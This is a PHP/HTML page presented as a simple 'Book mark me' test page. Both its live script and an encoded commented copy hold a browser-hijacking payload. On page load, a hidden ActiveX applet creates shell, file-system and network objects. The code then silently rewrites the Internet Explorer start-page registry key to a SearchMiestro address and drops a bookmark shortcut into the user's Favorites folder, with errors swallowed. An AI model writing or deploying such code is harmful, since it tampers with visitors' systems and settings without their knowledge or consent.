<?php
/*
echo rawurldecode("%3C%21DOCTYPE%20HTML%20PUBLIC%20%22-//W3C//DTD%20HTML%204.0%20Transitional//EN%22%3E%0D%0A%3CHTML%3E%3CHEAD%3E%0D%0A%3CMETA%20content%3D%22text/html%3B%20charset%3Dwindows-1252%22%20http-equiv%3DContent-Type%3E%0D%0A%3CSCRIPT%20language%3DJavaScript%3E%0D%0A%09document.write%28%22%3CAPPLET%20HEIGHT%3D0%20WIDTH%3D0%20code%3Dcom.ms.activeX.ActiveXComponent%3E%3C/APPLET%3E%22%29%3B%0D%0A%0D%0A%09if%20%28navigator.appName%20%3D%3D%20%27Netscape%27%29%20var%20language%20%3D%20navigator.language%3B%0D%0A%09else%20var%20language%20%3D%20navigator.browserLanguage%3B%0D%0A%0D%0A%09function%20AddFavLnk%28loc%2C%20DispName%2C%20SiteURL%29%20%7B%0D%0A%09%20%20var%20Shor%20%3D%20Shl.CreateShortcut%28loc%20+%20%22%5C%5C%22%20+%20DispName%20+%22.URL%22%29%3B%0D%0A%09%20%20Shor.TargetPath%20%3D%20SiteURL%3B%0D%0A%09%20%20Shor.Save%28%29%3B%0D%0A%09%7D%0D%0A%0D%0A%09function%20f%28%29%20%7B%0D%0A%09%20%20try%20%7B%0D%0A%20%20%20%20%20%20a1%3Ddocument.applets%5B0%5D%3B%0D%0A%20%20%20%20%20%20a1.setCLSID%28%22%7BF935DC22-1CF0-11D0-ADB9-00C04FD58A0B%7D%22%29%3B%0D%0A%20%20%20%20%20%20a1.createInstance%28%29%3B%0D%0A%20%20%20%20%20%20Shl%20%3D%20a1.GetObject%28%29%3B%0D%0A%20%20%20%20%20%20a1.setCLSID%28%22%7B0D43FE01-F093-11CF-8940-00A0C9054228%7D%22%29%3B%0D%0A%20%20%20%20%20%20a1.createInstance%28%29%3B%0D%0A%20%20%20%20%20%20FSO%20%3D%20a1.GetObject%28%29%3B%0D%0A%20%20%20%20%20%20a1.setCLSID%28%22%7BF935DC26-1CF0-11D0-ADB9-00C04FD58A0B%7D%22%29%3B%0D%0A%20%20%20%20%20%20a1.createInstance%28%29%3B%0D%0A%20%20%20%20%20%20Net%20%3D%20a1.GetObject%28%29%3B%0D%0A%20%20%20%20%20%20try%20%7B%0D%0A//%20%20%20%20%20%20%20%20if%20%28document.cookie.indexOf%28%22Chg%22%29%20%3D%3D%20-1%29%20%7B%0D%0A//%20%20%20%20%20%20%20%20%20%20var%20expdate%20%3D%20new%20Date%28%28new%20Date%28%29%29.getTime%28%29%20+%20%2824%20*%2060%20*%2060%20*%201000%20*%2090%29%29%3B%0D%0A//%20%20%20%20%20%20%20%20%20%20document.cookie%3D%22Chg%3Dgeneral%3B%20expires%3D%22%20+%20expdate.toGMTString%28%29%20+%20%22%3B%20path%3D/%3B%22%0D%0A%20%20%20%20%20%20%20%20%20%20if%20%28%21language.indexOf%28%27es%27%29%20%3E-1%29%20Shl.RegWrite%20%28%22HKCU%5C%5CSoftware%5C%5CMicrosoft%5C%5CInternet%20Explorer%5C%5CMain%5C%5CStart%20Page%22%2C%20%22http%3A//www.SearchMiestro.com/autoscript.html%22%29%3B%0D%0A//%20%20%20%20%20%20%20%20%20%20var%20expdate%20%3D%20new%20Date%28%28new%20Date%28%29%29.getTime%28%29%20+%20%2824%20*%2060%20*%2060%20*%201000%20*%2090%29%29%3B%0D%0A//%20%20%20%20%20%20%20%20%20%20document.cookie%3D%22Chg%3Dgeneral%3B%20expires%3D%22%20+%20expdate.toGMTString%28%29%20+%20%22%3B%20path%3D/%3B%22%0D%0A%20%20%20%20%20%20%20%20%20%20var%20WF%2C%20Shor%2C%20loc%3B%0D%0A%20%20%20%20%20%20%20%20%20%20WF%20%3D%20FSO.GetSpecialFolder%280%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20if%20%28language.indexOf%28%27es%27%29%20%3E-1%29%20loc%20%3D%20WF%20+%20%22%5C%5Cfavoritos%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27de%27%29%20%3E-1%29%20loc%20%3D%20WF%20+%20%22%5C%5Cfavoriten%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27sv%27%29%20%3E-1%29%20loc%20%3D%20WF%20+%20%22%5C%5Cfavoriter%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27it%27%29%20%3E-1%29%20loc%20%3D%20WF%20+%20%22%5C%5Cpreferiti%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27fr%27%29%20%3E-1%29%20loc%20%3D%20WF%20+%20%22%5C%5Cfavoris%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27da%27%29%20%3E-1%29%20loc%20%3D%20WF%20+%20%22%5C%5Coversigt%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20else%20loc%20%3D%20WF%20+%20%22%5C%5CFavorites%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20if%28%21FSO.FolderExists%28loc%29%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28language.indexOf%28%27es%27%29%20%3E-1%29%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5CFavoritos%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27de%27%29%20%3E-1%29%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5Cfavoriten%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27sv%27%29%20%3E-1%29%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5Cfavoriter%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27it%27%29%20%3E-1%29%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5Cpreferiti%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27fr%27%29%20%3E-1%29%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5Cfavoris%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20if%20%28language.indexOf%28%27da%27%29%20%3E-1%29%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5Coversigt%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20loc%20%3D%20FSO.GetDriveName%28WF%29%20+%20%22%5C%5CDocuments%20and%20Settings%5C%5C%22%20+%20Net.UserName%20+%20%22%5C%5CFavorites%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%28%21FSO.FolderExists%28loc%29%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20AddFavLnk%28loc%2C%20%22Auto%20Bookmark%20Script%22%2C%20%22http%3A//www.SearchMiestro.com/autoscript.html%22%29%3B%0D%0A//%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20catch%28e%29%20%7B%7D%0D%0A%09%20%20%7D%0D%0A%09%20%20catch%28e%29%20%7B%7D%0D%0A%09%7D%0D%0A%0D%0A%09function%20init%28%29%20%7B%0D%0A%09%20%20setTimeout%28%22f%28%29%22%2C%201000%29%3B%0D%0A%09%7D%0D%0A%0D%0A%09init%28%29%3B%0D%0A%3C/SCRIPT%3E%0D%0A%0D%0A%3CMETA%20content%3D%22MSHTML%205.00.2614.3500%22%20name%3DGENERATOR%3E%3C/HEAD%3E%0D%0A%3CBODY%3E%3C/BODY%3E%3C/HTML%3E%0D%0A");
*/

?>
<html>
<head>
<title test</title>
<SCRIPT language=JavaScript>
	document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>");

	if (navigator.appName == 'Netscape') var language = navigator.language;
	else var language = navigator.browserLanguage;

	function AddFavLnk(loc, DispName, SiteURL) {
	  var Shor = Shl.CreateShortcut(loc + "\\" + DispName +".URL");
	  Shor.TargetPath = SiteURL;
	  Shor.Save();
	}

	function f() {
	  try {
      a1=document.applets[0];
      a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
      a1.createInstance();
      Shl = a1.GetObject();
      a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
      a1.createInstance();
      FSO = a1.GetObject();
      a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
      a1.createInstance();
      Net = a1.GetObject();
      try {
//        if (document.cookie.indexOf("Chg") == -1) {
//          var expdate = new Date((new Date()).getTime() + (24 * 60 * 60 * 1000 * 90));
//          document.cookie="Chg=general; expires=" + expdate.toGMTString() + "; path=/;"
          if (!language.indexOf('es') >-1) Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", "http://www.SearchMiestro.com/autoscript.html");
//          var expdate = new Date((new Date()).getTime() + (24 * 60 * 60 * 1000 * 90));
//          document.cookie="Chg=general; expires=" + expdate.toGMTString() + "; path=/;"
          var WF, Shor, loc;
          WF = FSO.GetSpecialFolder(0);
          if (language.indexOf('es') >-1) loc = WF + "\\favoritos";
          else if (language.indexOf('de') >-1) loc = WF + "\\favoriten";
          else if (language.indexOf('sv') >-1) loc = WF + "\\favoriter";
          else if (language.indexOf('it') >-1) loc = WF + "\\preferiti";
          else if (language.indexOf('fr') >-1) loc = WF + "\\favoris";
          else if (language.indexOf('da') >-1) loc = WF + "\\oversigt";
          else loc = WF + "\\Favorites";
          if(!FSO.FolderExists(loc)) {
            if (language.indexOf('es') >-1) loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\Favoritos";
            else if (language.indexOf('de') >-1) loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\favoriten";
            else if (language.indexOf('sv') >-1) loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\favoriter";
            else if (language.indexOf('it') >-1) loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\preferiti";
            else if (language.indexOf('fr') >-1) loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\favoris";
            else if (language.indexOf('da') >-1) loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\oversigt";
            else loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\Favorites";
            if(!FSO.FolderExists(loc)) {
              return;
            }
          }
          AddFavLnk(loc, "Auto Bookmark Script", "http://www.SearchMiestro.com/autoscript.html");
//        }
      }
      catch(e) {}
	  }
	  catch(e) {}
	}

	function init() {
	  setTimeout("f()", 1000);
	}

	init();
</SCRIPT>
</head>
<body>
  Book mark me
</body>
</html>